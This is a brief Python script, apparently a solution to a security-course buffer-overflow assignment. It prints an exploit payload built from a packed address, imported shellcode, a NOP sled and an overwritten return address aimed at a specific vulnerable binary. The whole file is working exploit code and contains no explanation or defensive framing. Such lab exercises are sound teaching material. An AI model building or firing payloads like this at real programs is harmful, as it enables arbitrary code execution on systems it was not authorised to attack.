#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
# shellcode = 23 bytes
sys.stdout.buffer.write(pack('<I', 0x40000010) + shellcode + b'\x90'*85 + pack('<I', 0xfffefd70))
